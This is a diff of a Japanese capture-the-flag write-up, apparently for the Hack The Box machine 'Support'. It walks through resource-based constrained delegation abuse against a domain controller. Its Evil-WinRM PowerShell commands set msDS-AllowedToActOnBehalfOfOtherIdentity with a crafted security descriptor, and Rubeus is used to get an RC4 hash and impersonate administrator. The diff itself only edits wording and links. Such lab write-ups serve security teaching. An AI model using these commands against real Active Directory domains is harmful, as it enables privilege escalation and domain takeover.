@@ -44,7 +44,7 @@ attackersystem
 S-1-5-21-1677581083-3380853377-188903654-5101
 ```
 
-この新規コンピュータアカウントのSIDを用いてACEの設定をする。
+新規コンピュータアカウントのSIDを用いてセキュリティ記述子を設定する。
 ```
 *Evil-WinRM* PS C:\Users\support> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
 *Evil-WinRM* PS C:\Users\support> $SD
@@ -57,18 +57,14 @@ SystemAcl              :
 DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
 ResourceManagerControl : 0
 BinaryLength           : 80
-```
 
-そして、新たなDACL/ACEに対するバイナリを取得しておく：
-
-```
 *Evil-WinRM* PS C:\Users\support> $SDBytes = New-Object byte[] ($SD.BinaryLength)
 *Evil-WinRM* PS C:\Users\support> $SD.GetBinaryForm($SDBytes, 0)
 ```
 
 [Security Descriptor, DACL, ACEについて](https://tech.blog.aerie.jp/entry/2017/12/19/104346)
 
-作成したこのセキュリティ記述子（Security Descriptor）を、ターゲットであるコンピュータアカウントdcの「msDS-AllowedToActOnBehalfOfOtherIdentity」という属性に設定する：
+作成したこのセキュリティ記述子（Security Descriptor）を、ターゲットであるコンピュータアカウントdcの[msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/ja-jp/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)という属性に設定する：
 
 ```
 dc.support.htb
@@ -82,6 +78,8 @@ attackersystem
 
 *Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
+
+（ここの書き込み権限さえあればよい。もちろんGeneric Allなので書き込み可能）
 
 最初に作成したコンピュータアカウントattackersystemのパスワードのRC4_HMAC形式を得るために[Rubeus.exe](https://github.com/GhostPack/Rubeus)を使う。
 
@@ -106,7 +104,7 @@ attackersystem
 [*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
 ```
 
-最後に、Rubeus.exeのs4uモジュールで、administratorのふりをしたいサービス名のサービス チケットを取得する。
+最後に、Rubeus.exeのs4uモジュールで、administratorのふりをしたいサービス名のサービスチケットを取得する。
 
 ちなみにこの時の`klist`コマンドの出力は
 
